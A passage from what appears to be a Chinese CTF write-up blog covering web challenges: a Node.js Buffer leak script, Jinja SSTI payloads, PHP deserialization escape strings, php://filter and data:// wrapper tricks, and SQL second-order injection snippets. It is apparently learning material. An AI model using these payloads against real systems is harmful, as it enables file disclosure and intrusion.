<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2494e4bf06734c39be2e1626f757ba4c&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sql二次注入姿势"><a href="#sql二次注入姿势" class="headerlink" title="sql二次注入姿势"></a>sql二次注入姿势</h2><p>适用于输入数据时进行了过滤，但是网页显示数据库数据未进行过滤的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#39; + ascii(substr(database(),1,1)) +&#39;0</span><br><span class="line">0&#39; + ascii(substr(database() from 1 for 1)) +&#39;0</span><br></pre></td></tr></table></figure>
<h2 id="python的网页操作（re库）"><a href="#python的网页操作（re库）" class="headerlink" title="python的网页操作（re库）"></a>python的网页操作（re库）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">resp = requests.post(url=url, data=data) <span class="comment">#以post提交数据，数据返回给resp</span></span><br><span class="line">resp.text <span class="comment">#响应报文</span></span><br><span class="line">re.search(pattern, string) <span class="comment">#搜索string中出现pattern的字符串</span></span><br></pre></td></tr></table></figure>
<h1 id="leaking"><a href="#leaking" class="headerlink" title="leaking"></a>leaking</h1><p>考察：node.js逃逸</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/112387663">https://blog.csdn.net/weixin_44037296/article/details/112387663</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46676743/article/details/112669105">https://blog.csdn.net/weixin_46676743/article/details/112669105</a></p>
<p>不知道咋说，直接抄源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># encoding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;220.249.52.134:41148&#x2F;?data&#x3D;Buffer(500)&#39;</span><br><span class="line">response &#x3D; &#39;&#39;</span><br><span class="line">while &#39;flag&#39; not in response:</span><br><span class="line">        req &#x3D; requests.get(url)</span><br><span class="line">        response &#x3D; req.text</span><br><span class="line">        print(req.status_code)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if &#39;flag&#123;&#39; in response:</span><br><span class="line">            print(response)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4nother_h34rtbleed_in_n0dejs&#125;</span><br></pre></td></tr></table></figure>
<h2 id="node-js下的vm"><a href="#node-js下的vm" class="headerlink" title="node.js下的vm"></a>node.js下的vm</h2><p>一种隔离运行代码的沙箱，可以隔离当前环境上下文，但能访问当前上下文中的global变量</p>
<h2 id="node-js下的沙箱逃逸"><a href="#node-js下的沙箱逃逸" class="headerlink" title="node.js下的沙箱逃逸"></a>node.js下的沙箱逃逸</h2><p>由于js原型链的原因，可以通过contructor寻找变量prototype的方式，从而执行Function，达到沙箱逃逸的效果</p>
<h2 id="node下的Buffer"><a href="#node下的Buffer" class="headerlink" title="node下的Buffer"></a>node下的Buffer</h2><p>在较早一点的<strong>node.js</strong>版本中 (8.0 之前)，当 <code>Buffer</code> 的构造函数传入数字时, 会得到与数字长度一致的一个 <code>Buffer</code>，并且这个 <code>Buffer</code> 是未清零的。8.0 之后的版本可以通过另一个函数 <code>Buffer.allocUnsafe(size)</code> 来获得未清空的内存。</p>
<h1 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h1><p>考察：SSTI</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/13964561.html">https://www.cnblogs.com/zhengna/p/13964561.html</a></p>
<p>进入网页，发现除了主页面，login和register都登不进去。</p>
<p>显示apache2.4.10，查询是否有相关可利用漏洞，失败。</p>
<p>根据wp，login.php和register.php下均有提示flag位置（！！！一定要查看源码，不能访问的页面也要查看</p>
<p>在URL上测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45205&#x2F;index.php&#x2F;&#123;&#123; 1+1&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>返回2，说明可以SSTI注入</p>
<p>尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;).read()</span><br></pre></td></tr></table></figure>
<p>不能得到结果，说明有绕过</p>
<p>新姿势，通过request传参进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45205&#x2F;index.php&#x2F;&#123;&#123; &#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;386fd2a442e4b6841a294c2f66c864a8&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SSTI新姿势"><a href="#SSTI新姿势" class="headerlink" title="SSTI新姿势"></a>SSTI新姿势</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br><span class="line"># 注意，字符之间的连接点没了，以及括号（）和下标[]需要放在里面</span><br></pre></td></tr></table></figure>
<h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>考察：php代码审计，php序列化</p>
<p>打开页面，打开view-source，可以看到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若已经拥有SESSION，则把SESSION删除</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="comment"># 将全局变量$_POST解开，相当于得到$user=&#x27;guest&#x27;,$function=$function</span></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>根据代码，访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:58008&#x2F;index.php?f&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p>可以php的配置信息，并得到flag的可能地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3_f1ag.php</span><br></pre></td></tr></table></figure>
<p>那么按照常理，现在就应该是在URL上提交（GET方式）或POST数据提交，查看相关文件的操作了</p>
<p><strong>注意，此处有一个关键要点是通过post方式提交_SESSION，修改_SESSION中的参数，来实现查看文件</strong></p>
<p>根据代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p>所以要把d0g3_f1ag.php在base64_encode后，填充入userinfo的img下标中</p>
<p>而userinfo又是由这一句得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br></pre></td></tr></table></figure>
<p>serialize_info由$SESSION得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br></pre></td></tr></table></figure>
<p>而SESSION会经过filter，且其中的img标签会被修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据wp，使用php序列化的逃逸，构成下列payload（下面有解析）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;cb08b7952dfbcf0ed90a8d07db20e139&#125; </span><br></pre></td></tr></table></figure>


<h2 id="php反序列化逃逸原理"><a href="#php反序列化逃逸原理" class="headerlink" title="php反序列化逃逸原理"></a>php反序列化逃逸原理</h2><p>首先序列化格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; </span><br><span class="line">    [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;Hed9eh0g&quot;</span> </span><br><span class="line">    [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line">序列化后会得到</span><br><span class="line"><span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>其次，序列化有一种特点，若在序列化过程中，有一些字符被过滤替换为空，会尝试向后读取相同位数字符。如下flag被过滤的情况</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;</span><br><span class="line">    s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;</span><br><span class="line">    s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">        s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a:3:&#123;</span></span><br><span class="line"><span class="string">    s:4:&quot;</span>user<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:24:&quot;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>因此，可以构造序列化字符串，绕过相关过滤</p>
<p>本题中逃逸的解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">未过滤前</span><br><span class="line">_SESSION[flagflag]=<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">序列化后</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>flagflag<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:58:&quot;</span></span><br><span class="line">		<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">过滤后</span><br><span class="line">a:<span class="number">2</span>:&#123;</span><br><span class="line">	s:<span class="number">8</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">	s:<span class="number">58</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">		&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">		s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">	<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">反序列化填充后，再序列化时</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>s:<span class="number">58</span>:<span class="string">&quot;&quot;</span>;<span class="string">&quot;; // 字符串里的东西随便填</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>


<h1 id="nizhuansiwei"><a href="#nizhuansiwei" class="headerlink" title="nizhuansiwei"></a>nizhuansiwei</h1><p>来源：2019 ZJCTF</p>
<p>考察：php反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>很明显，需要提交text,file,password三个变量，进行绕过，回显flag</p>
<p>首先绕过text</p>
<p>尝试php://input，失败</p>
<p>使用data://text/plain，并进行base64编码</p>
<p>之后根据注释提示，读取useless.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>以下为useless.php，给了一个类，应该为php序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
<p>注意此时file设置为useless.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.200.241.244:59152&#x2F;index.php?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="php类的序列化代码"><a href="#php类的序列化代码" class="headerlink" title="php类的序列化代码"></a>php类的序列化代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$flag &#x3D; new Flag;</span><br><span class="line">$flag-&gt;file &#x3D; &quot;flag.php&quot;;</span><br><span class="line">echo(serialize($flag));</span><br></pre></td></tr></table></figure>
<h1 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h1><p>来源：csaw-ctf-2016-quals</p>
<p>考察：perl文件上传</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.it610.com/article/1304921195820388352.htm">https://www.it610.com/article/1304921195820388352.htm</a></p>
<p>猜测php代码为</p>
